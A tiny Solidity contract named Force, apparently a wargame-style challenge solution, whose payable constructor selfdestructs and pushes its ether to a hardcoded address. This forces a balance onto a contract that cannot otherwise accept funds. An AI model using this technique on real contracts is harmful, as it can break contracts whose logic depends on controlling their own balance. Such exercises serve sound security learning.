// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Force {
    constructor() payable {
        selfdestruct(payable(0x374bF5D64EC8b3f2bE31011cD19Bbc0ad1912f2E));
    }
}
